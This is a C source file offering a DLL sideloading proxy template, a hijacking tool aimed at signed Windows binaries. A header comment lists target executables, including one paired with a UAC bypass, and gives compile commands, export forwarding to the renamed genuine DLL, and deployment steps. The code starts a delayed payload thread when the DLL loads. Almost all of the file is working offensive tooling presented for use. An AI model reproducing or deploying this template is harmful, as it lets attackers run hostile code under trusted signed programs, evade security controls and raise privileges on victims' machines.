/*
 * DLL Sideloading — proxy DLL template for signed binary hijacking
 *
 * Common sideloading targets (signed Microsoft/vendor binaries that
 * load DLLs from their directory without full path):
 *
 *   Binary                     DLL loaded        Technique
 *   ─────────────────────────  ────────────────  ─────────────
 *   OneDriveStandaloneUpdater  version.dll       DLL proxying
 *   computerdefaults.exe       profapi.dll       UAC bypass + sideload
 *   msbuild.exe                csc.dll           Build tool abuse
 *
 * This template uses a .def file approach to forward exports to the
 * real DLL, avoiding type conflicts with windows headers.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o version.dll dll_sideload.c \
 *       dll_sideload.def -Wl,--enable-stdcall-fixup
 *
 * The .def file (dll_sideload.def) must list forwarded exports:
 *   EXPORTS
 *     GetFileVersionInfoA = real_version.GetFileVersionInfoA
 *     GetFileVersionInfoW = real_version.GetFileVersionInfoW
 *     ...etc
 *
 * Deploy: rename real version.dll to real_version.dll, place this
 * DLL as version.dll next to the target signed binary.
 */

#include <windows.h>

static HANDLE g_payload_thread = NULL;

typedef void (*payload_func)(void);
static payload_func g_payload = NULL;

static DWORD WINAPI payload_thread(LPVOID param) {
    (void)param;
    Sleep(3000);
    if (g_payload) g_payload();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    (void)hinstDLL; (void)lpReserved;
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        g_payload_thread = CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void set_sideload_payload(payload_func fn) {
    g_payload = fn;
}
